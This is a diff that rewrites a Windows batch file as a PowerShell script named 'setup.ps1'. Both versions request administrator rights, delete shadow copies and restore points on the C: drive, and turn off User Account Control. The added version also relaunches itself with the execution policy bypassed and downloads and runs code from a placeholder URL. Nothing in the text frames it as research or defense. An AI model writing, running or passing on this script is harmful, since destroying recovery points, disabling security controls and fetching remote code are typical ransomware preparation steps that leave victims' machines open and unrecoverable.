@@ -1,20 +1,19 @@
-@echo off
-:: Check for administrator privileges
-NET FILE >nul 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo Requesting administrator privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
-    exit /b
-)
+# setup.ps1
 
-:: 1. Disable System Protection for C: drive and delete restore points
-echo Configuring System Protection...
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Requesting administrator privileges..."
+    Start-Process powershell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm https://seu-link.com/setup.ps1)`""
+    exit
+}
+
+# 1. Desabilitar System Protection
+Write-Host "Configuring System Protection..."
 wmic shadowsettings set windowsserver=No
 wmic shadowstorage delete /nointeractive /on=C:
 
-:: 2. Disable UAC (User Account Control)
-echo Configuring Admin mode (disabling UAC)...
+# 2. Desabilitar UAC
+Write-Host "Disable UAC (User Account Control)"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 
-echo All tasks completed.
+Write-Host "All tasks completed."
 pause
